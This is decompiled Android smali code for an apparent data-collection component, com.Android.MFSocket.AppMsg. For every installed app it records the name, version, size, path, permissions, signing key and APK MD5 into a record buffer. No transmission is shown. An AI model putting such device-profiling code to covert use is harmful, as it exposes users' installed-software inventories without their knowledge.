.class public Lcom/Android/MFSocket/AppMsg;
.super Ljava/lang/Object;
.source "AppMsg.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/Android/MFSocket/AppMsg$PkgSizeObserver;
    }
.end annotation


# instance fields
.field private bOK:Z

.field private cachesize:J

.field private codesize:J

.field private datasize:J

.field private mContext:Landroid/content/Context;

.field private mSizeObserver:Lcom/Android/MFSocket/AppMsg$PkgSizeObserver;

.field private totalsize:J


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 33
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 34
    iput-object p1, p0, Lcom/Android/MFSocket/AppMsg;->mContext:Landroid/content/Context;

    .line 35
    return-void
.end method

.method static synthetic access$0(Lcom/Android/MFSocket/AppMsg;J)V
    .locals 0

    .prologue
    .line 27
    iput-wide p1, p0, Lcom/Android/MFSocket/AppMsg;->cachesize:J

    return-void
.end method

.method static synthetic access$1(Lcom/Android/MFSocket/AppMsg;J)V
    .locals 0

    .prologue
    .line 28
    iput-wide p1, p0, Lcom/Android/MFSocket/AppMsg;->datasize:J

    return-void
.end method

.method static synthetic access$2(Lcom/Android/MFSocket/AppMsg;J)V
    .locals 0

    .prologue
    .line 29
    iput-wide p1, p0, Lcom/Android/MFSocket/AppMsg;->codesize:J

    return-void
.end method

.method static synthetic access$3(Lcom/Android/MFSocket/AppMsg;)J
    .locals 2

    .prologue
    .line 27
    iget-wide v0, p0, Lcom/Android/MFSocket/AppMsg;->cachesize:J

    return-wide v0
.end method

.method static synthetic access$4(Lcom/Android/MFSocket/AppMsg;)J
    .locals 2

    .prologue
    .line 28
    iget-wide v0, p0, Lcom/Android/MFSocket/AppMsg;->datasize:J

    return-wide v0
.end method

.method static synthetic access$5(Lcom/Android/MFSocket/AppMsg;)J
    .locals 2

    .prologue
    .line 29
    iget-wide v0, p0, Lcom/Android/MFSocket/AppMsg;->codesize:J

    return-wide v0
.end method

.method static synthetic access$6(Lcom/Android/MFSocket/AppMsg;J)V
    .locals 0

    .prologue
    .line 30
    iput-wide p1, p0, Lcom/Android/MFSocket/AppMsg;->totalsize:J

    return-void
.end method

.method static synthetic access$7(Lcom/Android/MFSocket/AppMsg;Z)V
    .locals 0

    .prologue
    .line 31
    iput-boolean p1, p0, Lcom/Android/MFSocket/AppMsg;->bOK:Z

    return-void
.end method


# virtual methods
.method GetAppMsg(Ljava/lang/StringBuffer;)V
    .locals 30
    .param p1, "appMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 78
    new-instance v28, Lcom/Android/MFSocket/AppMsg$PkgSizeObserver;

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/Android/MFSocket/AppMsg$PkgSizeObserver;-><init>(Lcom/Android/MFSocket/AppMsg;)V

    move-object/from16 v0, v28

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/Android/MFSocket/AppMsg;->mSizeObserver:Lcom/Android/MFSocket/AppMsg$PkgSizeObserver;

    .line 79
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/AppMsg;->mContext:Landroid/content/Context;

    move-object/from16 v28, v0

    invoke-virtual/range {v28 .. v28}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v21

    .line 80
    .local v21, "pm":Landroid/content/pm/PackageManager;
    const/16 v9, 0x3000

    .line 81
    .local v9, "flags":I
    move-object/from16 v0, v21

    invoke-virtual {v0, v9}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v19

    .line 83
    .local v19, "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    invoke-interface/range {v19 .. v19}, Ljava/util/List;->size()I

    move-result v18

    .line 84
    .local v18, "packageSize":I
    const/4 v11, 0x0

    .local v11, "i":I
    :goto_0
    move/from16 v0, v18

    if-lt v11, v0, :cond_0

    .line 166
    return-void

    .line 85
    :cond_0
    move-object/from16 v0, v19

    invoke-interface {v0, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v16

    check-cast v16, Landroid/content/pm/PackageInfo;

    .line 87
    .local v16, "packageInfo":Landroid/content/pm/PackageInfo;
    const-string v5, "system"

    .line 88
    .local v5, "appType":Ljava/lang/String;
    move-object/from16 v0, v16

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    move-object/from16 v28, v0

    move-object/from16 v0, v28

    iget v0, v0, Landroid/content/pm/ApplicationInfo;->flags:I

    move/from16 v28, v0

    and-int/lit8 v28, v28, 0x1

    if-nez v28, :cond_1

    .line 89
    const-string v5, "user"

    .line 95
    :cond_1
    move-object/from16 v0, v16

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    move-object/from16 v28, v0

    move-object/from16 v0, v28

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v28

    invoke-interface/range {v28 .. v28}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    .line 96
    .local v4, "appName":Ljava/lang/String;
    move-object/from16 v0, v16

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    move-object/from16 v17, v0

    .line 97
    .local v17, "packageName":Ljava/lang/String;
    move-object/from16 v0, v16

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    move-object/from16 v27, v0

    .line 99
    .local v27, "versionName":Ljava/lang/String;
    move-object/from16 v0, v16

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    move-object/from16 v28, v0

    move-object/from16 v0, v28

    iget-object v3, v0, Landroid/content/pm/ApplicationInfo;->publicSourceDir:Ljava/lang/String;

    .line 100
    .local v3, "appDir":Ljava/lang/String;
    new-instance v10, Ljava/text/SimpleDateFormat;

    const-string v28, "yyyy-MM-dd HH:mm:ss"

    move-object/from16 v0, v28

    invoke-direct {v10, v0}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 101
    .local v10, "formatter":Ljava/text/SimpleDateFormat;
    new-instance v6, Ljava/util/Date;

    new-instance v28, Ljava/io/File;

    move-object/from16 v0, v28

    invoke-direct {v0, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v28 .. v28}, Ljava/io/File;->lastModified()J

    move-result-wide v28

    move-wide/from16 v0, v28

    invoke-direct {v6, v0, v1}, Ljava/util/Date;-><init>(J)V

    .line 102
    .local v6, "curDate":Ljava/util/Date;
    invoke-virtual {v10, v6}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v25

    .line 103
    .local v25, "strDate":Ljava/lang/String;
    const-string v24, ""

    .line 104
    .local v24, "sig":Ljava/lang/String;
    const-string v13, ""

    .line 105
    .local v13, "md5":Ljava/lang/String;
    invoke-static {}, Lcom/Android/MFSocket/SocketRecv;->enableBaoKong()Z

    move-result v28

    if-eqz v28, :cond_3

    invoke-static/range {v17 .. v17}, Lcom/Android/MFSocket/SocketRecv;->isBaoKongPackage(Ljava/lang/String;)Z

    move-result v28

    if-eqz v28, :cond_3

    .line 107
    const/16 v28, 0x40

    :try_start_0
    move-object/from16 v0, v21

    move-object/from16 v1, v17

    move/from16 v2, v28

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v20

    .line 108
    .local v20, "pkgInfo":Landroid/content/pm/PackageInfo;
    move-object/from16 v0, v20

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->signatures:[Landroid/content/pm/Signature;

    move-object/from16 v28, v0

    if-eqz v28, :cond_2

    move-object/from16 v0, v20

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->signatures:[Landroid/content/pm/Signature;

    move-object/from16 v28, v0

    move-object/from16 v0, v28

    array-length v0, v0

    move/from16 v28, v0

    if-lez v28, :cond_2

    .line 109
    move-object/from16 v0, v20

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->signatures:[Landroid/content/pm/Signature;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    aget-object v28, v28, v29

    invoke-virtual/range {v28 .. v28}, Landroid/content/pm/Signature;->toByteArray()[B

    move-result-object v28

    move-object/from16 v0, p0

    move-object/from16 v1, v28

    invoke-virtual {v0, v1}, Lcom/Android/MFSocket/AppMsg;->parseSignature([B)Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v24

    .line 116
    .end local v20    # "pkgInfo":Landroid/content/pm/PackageInfo;
    :cond_2
    :goto_1
    :try_start_1
    invoke-static {v3}, Lcom/Android/MFSocket/MD5Msg;->fileMD5(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v13

    .line 122
    :cond_3
    :goto_2
    new-instance v26, Ljava/lang/StringBuffer;

    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V

    .line 125
    .local v26, "strPermissionsBuffer":Ljava/lang/StringBuffer;
    const/16 v28, 0x1000

    :try_start_2
    move-object/from16 v0, v21

    move-object/from16 v1, v17

    move/from16 v2, v28

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v20

    .line 126
    .restart local v20    # "pkgInfo":Landroid/content/pm/PackageInfo;
    move-object/from16 v0, v20

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->requestedPermissions:[Ljava/lang/String;

    move-object/from16 v22, v0

    .line 127
    .local v22, "sharedPkgList":[Ljava/lang/String;
    if-eqz v22, :cond_4

    .line 128
    move-object/from16 v0, v22

    array-length v0, v0

    move/from16 v23, v0
    :try_end_2
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_2 .. :try_end_2} :catch_3

    .line 129
    .local v23, "sharedSize":I
    const/4 v12, 0x0

    .local v12, "j":I
    :goto_3
    move/from16 v0, v23

    if-lt v12, v0, :cond_5

    .line 138
    .end local v12    # "j":I
    .end local v20    # "pkgInfo":Landroid/content/pm/PackageInfo;
    .end local v22    # "sharedPkgList":[Ljava/lang/String;
    .end local v23    # "sharedSize":I
    :cond_4
    :goto_4
    const/16 v28, 0x0

    :try_start_3
    move/from16 v0, v28

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/Android/MFSocket/AppMsg;->bOK:Z

    .line 139
    move-object/from16 v0, p0

    move-object/from16 v1, v21

    move-object/from16 v2, v17

    invoke-virtual {v0, v1, v2}, Lcom/Android/MFSocket/AppMsg;->queryPacakgeSize(Landroid/content/pm/PackageManager;Ljava/lang/String;)V

    .line 140
    const/4 v14, 0x0

    .local v14, "nTimeOut":I
    move v15, v14

    .line 141
    .end local v14    # "nTimeOut":I
    .local v15, "nTimeOut":I
    :goto_5
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/Android/MFSocket/AppMsg;->bOK:Z

    move/from16 v28, v0

    if-eqz v28, :cond_6

    move v14, v15

    .line 149
    .end local v15    # "nTimeOut":I
    .restart local v14    # "nTimeOut":I
    :goto_6
    const/16 v28, 0x0

    move/from16 v0, v28

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/Android/MFSocket/AppMsg;->bOK:Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 154
    .end local v14    # "nTimeOut":I
    :goto_7
    move-object/from16 v0, p1

    invoke-static {v4, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 155
    move-object/from16 v0, v17

    move-object/from16 v1, p1

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 156
    move-object/from16 v0, v27

    move-object/from16 v1, p1

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 157
    move-object/from16 v0, p1

    invoke-static {v5, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 158
    move-object/from16 v0, p0

    iget-wide v0, v0, Lcom/Android/MFSocket/AppMsg;->totalsize:J

    move-wide/from16 v28, v0

    move-wide/from16 v0, v28

    move-object/from16 v2, p1

    invoke-static {v0, v1, v2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(JLjava/lang/StringBuffer;)V

    .line 159
    move-object/from16 v0, v25

    move-object/from16 v1, p1

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 160
    move-object/from16 v0, p1

    invoke-static {v3, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 161
    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v28

    move-object/from16 v0, v28

    move-object/from16 v1, p1

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 162
    move-object/from16 v0, v24

    move-object/from16 v1, p1

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 163
    move-object/from16 v0, p1

    invoke-static {v13, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 164
    invoke-static/range {p1 .. p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 84
    add-int/lit8 v11, v11, 0x1

    goto/16 :goto_0

    .line 111
    .end local v26    # "strPermissionsBuffer":Ljava/lang/StringBuffer;
    :catch_0
    move-exception v8

    .line 112
    .local v8, "e1":Landroid/content/pm/PackageManager$NameNotFoundException;
    invoke-virtual {v8}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V

    goto/16 :goto_1

    .line 117
    .end local v8    # "e1":Landroid/content/pm/PackageManager$NameNotFoundException;
    :catch_1
    move-exception v7

    .line 118
    .local v7, "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_2

    .line 130
    .end local v7    # "e":Ljava/io/IOException;
    .restart local v12    # "j":I
    .restart local v20    # "pkgInfo":Landroid/content/pm/PackageInfo;
    .restart local v22    # "sharedPkgList":[Ljava/lang/String;
    .restart local v23    # "sharedSize":I
    .restart local v26    # "strPermissionsBuffer":Ljava/lang/StringBuffer;
    :cond_5
    :try_start_4
    aget-object v28, v22, v12

    move-object/from16 v0, v26

    move-object/from16 v1, v28

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 131
    const-string v28, ","

    move-object/from16 v0, v26

    move-object/from16 v1, v28

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_4
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_4 .. :try_end_4} :catch_3

    .line 129
    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_3

    .line 142
    .end local v12    # "j":I
    .end local v20    # "pkgInfo":Landroid/content/pm/PackageInfo;
    .end local v22    # "sharedPkgList":[Ljava/lang/String;
    .end local v23    # "sharedSize":I
    .restart local v15    # "nTimeOut":I
    :cond_6
    :try_start_5
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    .line 143
    const-wide/16 v28, 0x5

    invoke-static/range {v28 .. v29}, Ljava/lang/Thread;->sleep(J)V

    .line 144
    add-int/lit8 v14, v15, 0x1

    .end local v15    # "nTimeOut":I
    .restart local v14    # "nTimeOut":I
    const/16 v28, 0x64

    move/from16 v0, v28

    if-le v15, v0, :cond_7

    .line 145
    const-wide/16 v28, 0x0

    move-wide/from16 v0, v28

    move-object/from16 v2, p0

    iput-wide v0, v2, Lcom/Android/MFSocket/AppMsg;->totalsize:J
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_6

    .line 150
    .end local v14    # "nTimeOut":I
    :catch_2
    move-exception v7

    .line 151
    .local v7, "e":Ljava/lang/Exception;
    const-wide/16 v28, 0x0

    move-wide/from16 v0, v28

    move-object/from16 v2, p0

    iput-wide v0, v2, Lcom/Android/MFSocket/AppMsg;->totalsize:J

    goto/16 :goto_7

    .line 134
    .end local v7    # "e":Ljava/lang/Exception;
    :catch_3
    move-exception v28

    goto/16 :goto_4

    .restart local v14    # "nTimeOut":I
    :cond_7
    move v15, v14

    .end local v14    # "nTimeOut":I
    .restart local v15    # "nTimeOut":I
    goto/16 :goto_5
.end method

.method byteArrayToHex([B)Ljava/lang/String;
    .locals 8
    .param p1, "a"    # [B

    .prologue
    const/4 v3, 0x0

    .line 39
    new-instance v1, Ljava/lang/StringBuilder;

    array-length v2, p1

    mul-int/lit8 v2, v2, 0x2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 40
    .local v1, "sb":Ljava/lang/StringBuilder;
    array-length v4, p1

    move v2, v3

    :goto_0
    if-lt v2, v4, :cond_0

    .line 43
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    return-object v2

    .line 40
    :cond_0
    aget-byte v0, p1, v2

    .line 41
    .local v0, "b":B
    const-string v5, "%02x"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    and-int/lit16 v7, v0, 0xff

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    aput-object v7, v6, v3

    invoke-static {v5, v6}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 40
    add-int/lit8 v2, v2, 0x1

    goto :goto_0
.end method

.method parseSignature([B)Ljava/lang/String;
    .locals 9
    .param p1, "signature"    # [B

    .prologue
    .line 46
    const-string v5, ""

    .line 48
    .local v5, "sig":Ljava/lang/String;
    :try_start_0
    const-string v7, "X.509"

    invoke-static {v7}, Ljava/security/cert/CertificateFactory;->getInstance(Ljava/lang/String;)Ljava/security/cert/CertificateFactory;

    move-result-object v1

    .line 50
    .local v1, "certFactory":Ljava/security/cert/CertificateFactory;
    new-instance v7, Ljava/io/ByteArrayInputStream;

    invoke-direct {v7, p1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    invoke-virtual {v1, v7}, Ljava/security/cert/CertificateFactory;->generateCertificate(Ljava/io/InputStream;)Ljava/security/cert/Certificate;

    move-result-object v0

    .line 49
    check-cast v0, Ljava/security/cert/X509Certificate;

    .line 51
    .local v0, "cert":Ljava/security/cert/X509Certificate;
    invoke-virtual {v0}, Ljava/security/cert/X509Certificate;->getPublicKey()Ljava/security/PublicKey;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    .line 53
    .local v4, "pubKey":Ljava/lang/String;
    const-string v7, "DSA Public Key"

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 54
    const-string v7, "y:"

    invoke-virtual {v4, v7}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v7

    add-int/lit8 v7, v7, 0x2

    invoke-virtual {v4, v7}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    .line 64
    :cond_0
    :goto_0
    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    .line 69
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 74
    .end local v0    # "cert":Ljava/security/cert/X509Certificate;
    .end local v1    # "certFactory":Ljava/security/cert/CertificateFactory;
    .end local v4    # "pubKey":Ljava/lang/String;
    :goto_1
    return-object v5

    .line 55
    .restart local v0    # "cert":Ljava/security/cert/X509Certificate;
    .restart local v1    # "certFactory":Ljava/security/cert/CertificateFactory;
    .restart local v4    # "pubKey":Ljava/lang/String;
    :cond_1
    const-string v7, "modulus="

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 56
    const/16 v7, 0x3d

    invoke-virtual {v4, v7}, Ljava/lang/String;->indexOf(I)I

    move-result v6

    .line 57
    .local v6, "start":I
    const/16 v7, 0x2c

    invoke-virtual {v4, v7, v6}, Ljava/lang/String;->indexOf(II)I

    move-result v3

    .line 58
    .local v3, "end":I
    add-int/lit8 v7, v6, 0x1

    invoke-virtual {v4, v7, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    .line 59
    goto :goto_0

    .end local v3    # "end":I
    .end local v6    # "start":I
    :cond_2
    const-string v7, "modulus:"

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 60
    const/16 v7, 0x3a

    invoke-virtual {v4, v7}, Ljava/lang/String;->indexOf(I)I

    move-result v6

    .line 61
    .restart local v6    # "start":I
    const/16 v7, 0xa

    invoke-virtual {v4, v7, v6}, Ljava/lang/String;->indexOf(II)I

    move-result v3

    .line 62
    .restart local v3    # "end":I
    add-int/lit8 v7, v6, 0x1

    invoke-virtual {v4, v7, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    :try_end_0
    .catch Ljava/security/cert/CertificateException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v4

    goto :goto_0

    .line 71
    .end local v0    # "cert":Ljava/security/cert/X509Certificate;
    .end local v1    # "certFactory":Ljava/security/cert/CertificateFactory;
    .end local v3    # "end":I
    .end local v4    # "pubKey":Ljava/lang/String;
    .end local v6    # "start":I
    :catch_0
    move-exception v2

    .line 72
    .local v2, "e":Ljava/security/cert/CertificateException;
    invoke-virtual {v2}, Ljava/security/cert/CertificateException;->printStackTrace()V

    goto :goto_1
.end method

.method public queryPacakgeSize(Landroid/content/pm/PackageManager;Ljava/lang/String;)V
    .locals 7
    .param p1, "pm"    # Landroid/content/pm/PackageManager;
    .param p2, "pkgName"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 169
    if-eqz p2, :cond_0

    .line 173
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const-string v3, "getPackageSizeInfo"

    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    .line 174
    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v5

    const/4 v5, 0x1

    const-class v6, Landroid/content/pm/IPackageStatsObserver;

    aput-object v6, v4, v5

    .line 173
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 176
    .local v1, "getPackageSizeInfo":Ljava/lang/reflect/Method;
    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p2, v2, v3

    const/4 v3, 0x1

    iget-object v4, p0, Lcom/Android/MFSocket/AppMsg;->mSizeObserver:Lcom/Android/MFSocket/AppMsg$PkgSizeObserver;

    aput-object v4, v2, v3

    invoke-virtual {v1, p1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 182
    .end local v1    # "getPackageSizeInfo":Ljava/lang/reflect/Method;
    :cond_0
    return-void

    .line 177
    :catch_0
    move-exception v0

    .line 178
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 179
    throw v0
.end method
